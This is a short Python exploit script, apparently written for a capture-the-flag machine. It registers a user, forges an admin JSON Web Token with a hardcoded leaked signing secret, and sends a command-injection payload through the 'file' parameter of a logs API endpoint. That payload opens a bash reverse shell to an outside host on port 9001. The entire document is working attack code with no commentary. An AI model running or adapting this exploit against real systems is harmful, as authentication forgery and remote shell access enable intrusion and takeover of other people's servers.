import jwt 
import json
import requests as rq

url = 'http://10.10.11.120'
secret = 'gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE'

s = rq.Session()

def register(user, email, pswd):
	data = {'name': user, 'email': email, 'password': pswd}
	res = s.post(f'{url}/api/user/register', json=data)

def login(email, pswd):
	data = {'email': email, 'password': pswd}
	res = s.post(f'{url}/api/user/login', json=data)
	token = res.text
	return token

def forge_fake_token(token):
	token = jwt.decode(token, secret)
	fake_token = token
	fake_token['name'] = 'theadmin'
	fake_token = jwt.encode(fake_token, secret)
	print(f'auth-token: {fake_token.decode()}')
	return fake_token

def cmdi(cmd, headers):
	params = {'file': cmd}
	res = s.get(f'{url}/api/logs', headers=headers, params=params)
	print(res.text.replace('\\n', '\n'))
	return res.text

user  = 'iceiceice'
email = 'ice123@ice.com'
pswd  = 'iceice'

register(user, email, pswd)
token = login(email, pswd)
fake_token = forge_fake_token(token)

auth_header = {'auth-token': fake_token}
cmdi('; bash -c "bash -i >& /dev/tcp/10.10.17.233/9001 0>&1"', auth_header)
#res = s.get(f'{url}/api/priv', headers=auth_header)
#print(res.text)
